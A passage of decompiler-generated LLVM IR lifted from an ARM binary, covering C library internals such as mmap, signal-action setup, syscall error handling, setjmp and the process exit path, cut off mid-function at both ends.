  store i1 %v9_14998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14998, label %dec_label_pc_149a0, label %dec_label_pc_14988.dec_label_pc_14988_crit_edge

dec_label_pc_14988.dec_label_pc_14988_crit_edge:  ; preds = %dec_label_pc_14988
  %v0_14988.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14988

dec_label_pc_149a0:                               ; preds = %dec_label_pc_14988
  %v2_149a4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_149a4.pre, i32* %r0.global-to-local, align 4
  %v2_149a8 = add i32 %v2_149a4.pre, -67216
  store i32 %v2_149a8, i32* %r2.global-to-local, align 4
  store i32 %v2_149a8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_149b0 = icmp eq i32 %v2_149a8, 0
  store i1 %v2_149b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_149b0, label %dec_label_pc_149c8, label %dec_label_pc_149b8

dec_label_pc_149b8:                               ; preds = %dec_label_pc_149a0
  store i32 84416, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_149a8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_149c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_149c4 = inttoptr i32 %v1_149c4 to i32*
  store i32 0, i32* %v2_149c4, align 4
  %v2_149cc.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_149c8

dec_label_pc_149c8:                               ; preds = %dec_label_pc_149a0, %dec_label_pc_149b8
  %v2_149cc = phi i32 [ %v2_149a4.pre, %dec_label_pc_149a0 ], [ %v2_149cc.pre, %dec_label_pc_149b8 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_149cc, i32* %r1.global-to-local, align 4
  %v2_149d0 = add i32 %v2_149cc, 128
  %v3_149d0 = inttoptr i32 %v2_149d0 to i32*
  %v4_149d0 = load i32, i32* %v3_149d0, align 4
  store i32 %v4_149d0, i32* %r2.global-to-local, align 4
  store i32 %v4_149d0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_149d8 = icmp eq i32 %v4_149d0, 0
  store i1 %v2_149d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_149d8, label %dec_label_pc_149f0, label %dec_label_pc_149e0

dec_label_pc_149e0:                               ; preds = %dec_label_pc_149c8
  store i32 84456, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_149d0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_149ec = load i32, i32* %r0.global-to-local, align 4
  %v2_149ec = inttoptr i32 %v1_149ec to i32*
  store i32 0, i32* %v2_149ec, align 4
  br label %dec_label_pc_149f0

dec_label_pc_149f0:                               ; preds = %dec_label_pc_149c8, %dec_label_pc_149e0
  %v2_149f0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_149f0, i32* @r0, align 4
  %v1_149f4 = call i32 @_setjmp(i32 %v2_149f0)
  store i32 %v1_149f4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_149f8 = icmp eq i32 %v1_149f4, 0
  store i1 %v2_149f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_149f8, label %dec_label_pc_14a00, label %dec_label_pc_14a4c

dec_label_pc_14a00:                               ; preds = %dec_label_pc_149f0
  %v0_14a00 = call i32 @__aeabi_read_tp()
  store i32 %v0_14a00, i32* %r0.global-to-local, align 4
  %v1_14a04 = add i32 %v0_14a00, -1168
  store i32 %v1_14a04, i32* %r2.global-to-local, align 4
  %v2_14a0c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14a0c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_14a18 = add i32 %v2_14a0c, 56
  %v3_14a18 = inttoptr i32 %v2_14a18 to i32*
  %v4_14a18 = load i32, i32* %v3_14a18, align 4
  store i32 %v4_14a18, i32* %ip.global-to-local, align 4
  store i32 %v2_149f0, i32* %r3.global-to-local, align 4
  %v2_14a28 = add i32 %v0_14a00, -1040
  %v3_14a28 = inttoptr i32 %v2_14a28 to i32*
  store i32 %v2_149f0, i32* %v3_14a28, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_14a34 = load i32, i32* %ip.global-to-local, align 4
  %v1_14a34 = inttoptr i32 %v0_14a34 to i32*
  %v2_14a34 = load i32, i32* %v1_14a34, align 4
  store i32 %v2_14a34, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_14a44 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14ae8

dec_label_pc_14a4c:                               ; preds = %dec_label_pc_149f0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_14a50 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14a50, i32* %ip.global-to-local, align 4
  %v2_14a54 = add i32 %v2_14a50, 40
  %v3_14a54 = inttoptr i32 %v2_14a54 to i32*
  %v4_14a54 = load i32, i32* %v3_14a54, align 4
  store i32 %v4_14a54, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14a54)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_14a64 = load i32, i32* %stack_var_-416, align 4
  %v2_14a68 = add i32 %v2_14a64, 120
  %v3_14a68 = inttoptr i32 %v2_14a68 to i32*
  %v4_14a68 = load i32, i32* %v3_14a68, align 4
  store i32 %v4_14a68, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a6c

dec_label_pc_14a6c:                               ; preds = %dec_label_pc_14aa0.dec_label_pc_14a6c_crit_edge, %dec_label_pc_14a4c
  %v0_14a6c = phi i32 [ %v0_14a6c.pre, %dec_label_pc_14aa0.dec_label_pc_14a6c_crit_edge ], [ %v4_14a68, %dec_label_pc_14a4c ]
  %v1_14a6c = inttoptr i32 %v0_14a6c to i32*
  %v2_14a6c = load i32, i32* %v1_14a6c, align 4
  store i32 %v0_14a6c, i32* %r2.global-to-local, align 4
  store i32 %v2_14a6c, i32* %r4.global-to-local, align 4
  %v1_14a78 = add i32 %v2_14a6c, -1
  store i32 %v1_14a78, i32* %r1.global-to-local, align 4
  %v2_14a7c89 = load i32, i32* %v1_14a6c, align 4
  store i32 %v2_14a7c89, i32* %r3.global-to-local, align 4
  %v3_14a8091 = icmp uge i32 %v2_14a7c89, %v2_14a6c
  store i1 %v3_14a8091, i1* %cpsr_c.global-to-local, align 1
  %v9_14a8097 = icmp eq i32 %v2_14a7c89, %v2_14a6c
  store i1 %v9_14a8097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14a8097, label %dec_label_pc_14a88, label %dec_label_pc_14aa0

dec_label_pc_14a88:                               ; preds = %dec_label_pc_14a6c, %dec_label_pc_14a88.dec_label_pc_14a7c_crit_edge
  %v0_14a8898 = phi i32 [ %v1_14a80.pre, %dec_label_pc_14a88.dec_label_pc_14a7c_crit_edge ], [ %v2_14a6c, %dec_label_pc_14a6c ]
  store i32 %v0_14a8898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14a98 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14a98, label %dec_label_pc_14a9c, label %dec_label_pc_14a88.dec_label_pc_14a7c_crit_edge

dec_label_pc_14a88.dec_label_pc_14a7c_crit_edge:  ; preds = %dec_label_pc_14a88
  %v0_14a7c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14a80.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14a7c = inttoptr i32 %v0_14a7c.pre to i32*
  %v2_14a7c = load i32, i32* %v1_14a7c, align 4
  store i32 %v2_14a7c, i32* %r3.global-to-local, align 4
  %v3_14a80 = icmp uge i32 %v2_14a7c, %v1_14a80.pre
  store i1 %v3_14a80, i1* %cpsr_c.global-to-local, align 1
  %v9_14a80 = icmp eq i32 %v2_14a7c, %v1_14a80.pre
  store i1 %v9_14a80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14a80, label %dec_label_pc_14a88, label %dec_label_pc_14aa0

dec_label_pc_14a9c:                               ; preds = %dec_label_pc_14a88
  %v0_14a9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14a9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14aa0

dec_label_pc_14aa0:                               ; preds = %dec_label_pc_14a6c, %dec_label_pc_14a88.dec_label_pc_14a7c_crit_edge, %dec_label_pc_14a9c
  %v0_14aa8 = phi i32 [ %v0_14a9c, %dec_label_pc_14a9c ], [ %v2_14a7c89, %dec_label_pc_14a6c ], [ %v2_14a7c, %dec_label_pc_14a88.dec_label_pc_14a7c_crit_edge ]
  %v1_14aa0 = phi i32 [ %v0_14a9c, %dec_label_pc_14a9c ], [ %v2_14a6c, %dec_label_pc_14a6c ], [ %v1_14a80.pre, %dec_label_pc_14a88.dec_label_pc_14a7c_crit_edge ]
  %v3_14aa0 = icmp uge i32 %v0_14aa8, %v1_14aa0
  store i1 %v3_14aa0, i1* %cpsr_c.global-to-local, align 1
  %v9_14aa0 = icmp eq i32 %v0_14aa8, %v1_14aa0
  store i1 %v9_14aa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14aa0, label %dec_label_pc_14aa8, label %dec_label_pc_14aa0.dec_label_pc_14a6c_crit_edge

dec_label_pc_14aa0.dec_label_pc_14a6c_crit_edge:  ; preds = %dec_label_pc_14aa0
  %v0_14a6c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a6c

dec_label_pc_14aa8:                               ; preds = %dec_label_pc_14aa0
  %v2_14aa8 = icmp ne i32 %v1_14aa0, 0
  store i1 %v2_14aa8, i1* %cpsr_c.global-to-local, align 1
  %v7_14aa8 = icmp eq i32 %v1_14aa0, 1
  store i1 %v7_14aa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14aa8, label %dec_label_pc_14ae8, label %dec_label_pc_14ab0

dec_label_pc_14ab0:                               ; preds = %dec_label_pc_14aa8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14ae8

dec_label_pc_14ae8:                               ; preds = %dec_label_pc_14aa8, %dec_label_pc_14ab0, %dec_label_pc_14a00
  %storemerge2 = phi i32 [ %v0_14a44, %dec_label_pc_14a00 ], [ 0, %dec_label_pc_14ab0 ], [ 0, %dec_label_pc_14aa8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_14aec = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_14aec, i32* %r0.global-to-local, align 4
  %v0_14af0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14af0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_14ae8
  %v2_14af4 = load i32, i32* @r8, align 4
  %v8_14af4 = shl i32 %v2_14af4, %v1_14aec
  %v9_14af4 = and i32 %v8_14af4, %v1_14aec
  %v8_14af8 = lshr i32 %v2_14af4, %v9_14af4
  %v9_14af8 = and i32 %v8_14af8, %v9_14af4
  %v2_14afc = inttoptr i32 %v9_14af8 to i64*
  %v3_14afc = load i64, i64* %v2_14afc, align 4
  %v5_14afc = trunc i64 %v3_14afc to i32
  %v6_14afc = udiv i64 %v3_14afc, 4294967296
  %v7_14afc = trunc i64 %v6_14afc to i32
  store i32 %v5_14afc, i32* %r1.global-to-local, align 4
  %v9_14afc = sub i32 %v7_14afc, %v2_14af4
  %v1_14b00 = load i32, i32* %r4.global-to-local, align 4
  %v3_14b00 = mul i32 %v9_14afc, %v1_14b00
  %v5_14b08 = mul i32 %v1_14b00, 4
  %v5_14b0c = udiv i32 %v1_14b00, 2
  %v6_14b08 = and i32 %v5_14b0c, %v5_14b08
  %v6_14b0c = and i32 %v6_14b08, %v3_14b00
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_14b0c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_14ae8, %bb85
  %v5_14b10 = phi i32 [ %v1_14aec, %dec_label_pc_14ae8 ], [ %v6_14b0c, %bb85 ]
  ret i32 %v5_14b10

; uselistorder directives
  uselistorder i32 %v1_14b00, { 1, 0, 2 }
  uselistorder i32 %v1_14aec, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_14aa0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14a9c, { 1, 0, 2 }
  uselistorder i32 %v1_14a80.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14a6c, { 1, 0 }
  uselistorder i32 %v2_149cc, { 1, 0 }
  uselistorder i32 %v2_149a4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_14998, { 1, 0 }
  uselistorder i32 %v1_14994, { 3, 2, 1, 0 }
  uselistorder i32 %v1_14988, { 1, 0 }
  uselistorder i32 %v1_14954, { 1, 0 }
  uselistorder i32 %v1_14950, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14944, { 1, 0 }
  uselistorder i32 %v2_14920, { 1, 0, 2 }
  uselistorder i32 %v4_14904, { 1, 0, 2 }
  uselistorder i32 %v4_148f4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1483c, { 1, 2, 0 }
  uselistorder i32 %v2_14808, { 1, 2, 0 }
  uselistorder i32 %v1_14804, { 1, 2, 0 }
  uselistorder i1 %v2_147f0, { 1, 0, 2 }
  uselistorder i32 %v5_147f4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_147c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_147a8, { 1, 0, 2 }
  uselistorder i32 %v2_1479c, { 1, 0, 2 }
  uselistorder i32 %v3_1476c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 1, 2, 3, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 2, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 0, 10, 11, 12, 14, 13, 1, 15, 17, 16, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 3, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 7, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2008, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_14ae8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14aa0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14a88, { 1, 0 }
  uselistorder label %dec_label_pc_149f0, { 1, 0 }
  uselistorder label %dec_label_pc_149c8, { 1, 0 }
  uselistorder label %dec_label_pc_14944, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_148c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14898, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_14808, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_147f0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14b3c = load i32, i32* @r4, align 4
  store i32 %v3_14b3c, i32* %stack_var_-16, align 4
  %v3_14b48 = urem i32 %arg3, 4096
  %v2_14b4c = icmp eq i32 %v3_14b48, 0
  br i1 %v2_14b4c, label %dec_label_pc_14b70, label %dec_label_pc_14b54

dec_label_pc_14b54:                               ; preds = %entry
  %v0_14b58 = call i32 @__aeabi_read_tp()
  store i32 %v0_14b58, i32* %r0.global-to-local, align 4
  %v3_14b5c = load i16, i16* @global_var_21a48.352, align 2
  %v4_14b5c = sext i16 %v3_14b5c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14b68 = add i32 %v4_14b5c, %v0_14b58
  %v4_14b68 = inttoptr i32 %v3_14b68 to i32*
  store i32 22, i32* %v4_14b68, align 4
  %v0_14ba4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14ba4

dec_label_pc_14b70:                               ; preds = %entry
  %v0_14b80 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14b80, -4095
  br i1 %tmp, label %dec_label_pc_14ba0, label %dec_label_pc_14b88

dec_label_pc_14b88:                               ; preds = %dec_label_pc_14b70
  %v1_14b8c = sub i32 0, %v0_14b80
  %v3_14b90 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14b90 = sext i16 %v3_14b90 to i32
  %v0_14b94 = call i32 @__aeabi_read_tp()
  %v3_14b98 = add i32 %v4_14b90, %v0_14b94
  %v4_14b98 = inttoptr i32 %v3_14b98 to i32*
  store i32 %v1_14b8c, i32* %v4_14b98, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14ba0

dec_label_pc_14ba0:                               ; preds = %dec_label_pc_14b70, %dec_label_pc_14b88
  %v0_14ba0 = phi i32 [ %v0_14b80, %dec_label_pc_14b70 ], [ -1, %dec_label_pc_14b88 ]
  store i32 %v0_14ba0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14ba4

dec_label_pc_14ba4:                               ; preds = %dec_label_pc_14b54, %dec_label_pc_14ba0
  %v0_14ba4 = phi i32 [ %v0_14ba4.pre, %dec_label_pc_14b54 ], [ %v0_14ba0, %dec_label_pc_14ba0 ]
  store i32 %v0_14ba4, i32* %r0.global-to-local, align 4
  %v2_14ba8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14ba8, i32* @r4, align 4
  ret i32 %v0_14ba4

; uselistorder directives
  uselistorder i32 %v0_14ba4, { 1, 0 }
  uselistorder i32 %v0_14b80, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_14ba4, { 1, 0 }
  uselistorder label %dec_label_pc_14ba0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_14bb8 = load i32, i32* @lr, align 4
  store i32 %v0_14bb8, i32* %stack_var_-4, align 4
  %v0_14bc0 = load i32, i32* @r0, align 4
  %v3_14bc4 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14bc4 = sext i16 %v3_14bc4 to i32
  store i32 %v4_14bc4, i32* @r2, align 4
  %v0_14bc8 = call i32 @__aeabi_read_tp()
  %v1_14bcc = sub i32 0, %v0_14bc0
  store i32 %v1_14bcc, i32* @r3, align 4
  %v2_14bd0 = load i32, i32* @r2, align 4
  %v3_14bd0 = add i32 %v2_14bd0, %v0_14bc8
  %v4_14bd0 = inttoptr i32 %v3_14bd0 to i32*
  store i32 %v1_14bcc, i32* %v4_14bd0, align 4
  %v2_14bd8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_14bd8, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14be4 = load i32, i32* @r4, align 4
  %v6_14be4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_14bec = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_14bec, label %dec_label_pc_14c40, label %dec_label_pc_14c04

dec_label_pc_14c04:                               ; preds = %entry
  %v1_14c04 = add i32 %arg2, 4
  %v2_14c04 = inttoptr i32 %v1_14c04 to i32*
  %v3_14c04 = load i32, i32* %v2_14c04, align 4
  store i32 %v3_14c04, i32* @r3, align 4
  %v1_14c08 = and i32 %v3_14c04, 67108864
  %v2_14c08 = icmp eq i32 %v1_14c08, 0
  br i1 %v2_14c08, label %dec_label_pc_14c10, label %dec_label_pc_14c40

dec_label_pc_14c10:                               ; preds = %dec_label_pc_14c04
  store i32 20, i32* @r2, align 4
  %v2_14c14 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14c14, i32* @r0, align 4
  %v0_14c18 = call i32 @memcpy()
  %v0_14c40.pre = load i32, i32* @r5, align 4
  %v0_14c48.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14c40

dec_label_pc_14c40:                               ; preds = %dec_label_pc_14c04, %entry, %dec_label_pc_14c10
  %v0_14c48 = phi i32 [ %arg3, %dec_label_pc_14c04 ], [ %arg3, %entry ], [ %v0_14c48.pre, %dec_label_pc_14c10 ]
  %v0_14c44 = phi i32 [ %arg2, %dec_label_pc_14c04 ], [ 0, %entry ], [ %v2_14c14, %dec_label_pc_14c10 ]
  %v0_14c40 = phi i32 [ %arg1, %dec_label_pc_14c04 ], [ %arg1, %entry ], [ %v0_14c40.pre, %dec_label_pc_14c10 ]
  %v4_14c50 = call i32 @__syscall_rt_sigaction(i32 %v0_14c40, i32 %v0_14c44, i32 %v0_14c48, i32 8)
  store i32 %v3_14be4, i32* @r4, align 4
  store i32 %v6_14be4, i32* @r5, align 4
  ret i32 %v4_14c50

; uselistorder directives
  uselistorder label %dec_label_pc_14c40, { 2, 0, 1 }
}

define i32 @function_14c64(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c64:
  %v0_14c64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14c64, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14c64
  %v2_14c64 = load i32, i32* @r8, align 4
  %v4_14c64 = mul i32 %v2_14c64, 2
  %v5_14c64 = and i32 %v4_14c64, %arg1
  %v2_14c68 = load i32, i32* @ip, align 4
  %v4_14c68 = lshr i32 %v2_14c68, %v5_14c64
  %v5_14c68 = sub i32 32, %v5_14c64
  %v6_14c68 = shl i32 %v2_14c68, %v5_14c68
  %v7_14c68 = or i32 %v6_14c68, %v4_14c68
  %v9_14c68 = and i32 %v7_14c68, %v5_14c64
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14c64, %bb
  %v10_14c68 = phi i32 [ %arg1, %dec_label_pc_14c64 ], [ %v9_14c68, %bb ]
  ret i32 %v10_14c68

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_14c70 = call i32 @__sigsetjmp()
  ret i32 %v0_14c70
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14ca0 = load i32, i32* @r7, align 4
  store i32 %v3_14ca0, i32* %stack_var_-8, align 4
  %v0_14cac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14cac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14cac, -4095
  br i1 %tmp, label %dec_label_pc_14cd4, label %dec_label_pc_14cbc

dec_label_pc_14cbc:                               ; preds = %entry
  %v0_14cc0 = call i32 @__aeabi_read_tp()
  %v3_14cc4 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14cc4 = sext i16 %v3_14cc4 to i32
  %v0_14cc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14cc8 = sub i32 0, %v0_14cc8
  store i32 %v1_14cc8, i32* %r2.global-to-local, align 4
  %v3_14ccc = add i32 %v4_14cc4, %v0_14cc0
  %v4_14ccc = inttoptr i32 %v3_14ccc to i32*
  store i32 %v1_14cc8, i32* %v4_14ccc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14cd4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14cd4

dec_label_pc_14cd4:                               ; preds = %entry, %dec_label_pc_14cbc
  %v1_14cd8 = phi i32 [ %v0_14cac, %entry ], [ -1, %dec_label_pc_14cbc ]
  %v2_14cd4 = phi i32 [ %v3_14ca0, %entry ], [ %v2_14cd4.pre, %dec_label_pc_14cbc ]
  store i32 %v2_14cd4, i32* @r7, align 4
  ret i32 %v1_14cd8

; uselistorder directives
  uselistorder i32 %v0_14cac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14cd4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14cec

dec_label_pc_14cec:                               ; preds = %dec_label_pc_14d18, %dec_label_pc_14d2c, %entry
  %v0_14cec = phi i32 [ %arg1, %entry ], [ %v0_14cec.pre.pre, %dec_label_pc_14d2c ], [ %v0_14d18, %dec_label_pc_14d18 ]
  store i32 %v0_14cec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14cec, -4095
  br i1 %tmp, label %dec_label_pc_14d18, label %dec_label_pc_14d08

dec_label_pc_14d08:                               ; preds = %dec_label_pc_14cec
  %v0_14d08 = call i32 @__aeabi_read_tp()
  %v0_14d0c = load i32, i32* %r2.global-to-local, align 4
  %v1_14d0c = sub i32 0, %v0_14d0c
  store i32 %v1_14d0c, i32* %r2.global-to-local, align 4
  %v3_14d10 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14d10 = sext i16 %v3_14d10 to i32
  %v3_14d14 = add i32 %v4_14d10, %v0_14d08
  %v4_14d14 = inttoptr i32 %v3_14d14 to i32*
  store i32 %v1_14d0c, i32* %v4_14d14, align 4
  %v0_14d18.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14d18

dec_label_pc_14d18:                               ; preds = %dec_label_pc_14cec, %dec_label_pc_14d08
  %v0_14d18 = phi i32 [ %v0_14cec, %dec_label_pc_14cec ], [ %v0_14d18.pre, %dec_label_pc_14d08 ]
  store i32 %v0_14d18, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_14d18, -4095
  br i1 %tmp4, label %dec_label_pc_14cec, label %dec_label_pc_14d2c

dec_label_pc_14d2c:                               ; preds = %dec_label_pc_14d18
  %v0_14d2c = call i32 @__aeabi_read_tp()
  %v0_14d30 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d30 = sub i32 0, %v0_14d30
  store i32 %v1_14d30, i32* %r2.global-to-local, align 4
  %v3_14d34 = load i16, i16* @global_var_21a48.352, align 2
  %v4_14d34 = sext i16 %v3_14d34 to i32
  %v3_14d38 = add i32 %v4_14d34, %v0_14d2c
  %v4_14d38 = inttoptr i32 %v3_14d38 to i32*
